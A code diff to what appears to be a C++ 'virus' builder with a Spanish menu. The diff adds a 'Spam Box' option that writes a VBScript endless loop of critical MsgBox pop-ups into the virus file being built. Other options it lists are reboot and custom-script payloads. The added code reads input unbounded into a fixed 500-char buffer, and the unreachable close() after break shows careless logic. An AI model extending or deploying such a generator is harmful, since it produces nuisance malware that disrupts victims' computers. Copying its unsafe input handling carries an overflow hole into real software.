@@ -18,7 +18,8 @@ void mostrarOpciones()
     std::cout << "2. Abrir pagina web(SOLO CHROME)" << endl;
     std::cout << "3. Reiniciar PC(BETA)" << endl;
     std::cout << "4. Script Personalizado (VBscript)" << endl;
-    std::cout << "5. Terminar virus" << endl;
+    std::cout << "5. Spam Box" << endl;
+    std::cout << "6. Terminar virus" << endl;
 }
 
 void vbsSpanish()
@@ -99,6 +100,14 @@ void vbsSpanish()
             clearConsole
         }
         else if(option == 5)
+        {
+            char spamMessage[500];
+            std::cout << "Dime el mensaje spam que quieres que aparezca: ";
+            std::cin >> spamMessage;
+            virus << endl << "do" << endl << "x=MsgBox(\"" << spamMessage << "\"," << "vbOkOnly+vbCritical," << "\"" << spamMessage << "\"" << ")" << endl << "loop";
+            clearConsole
+        }
+        else if(option == 6)
         {
             break;
             virus.close();
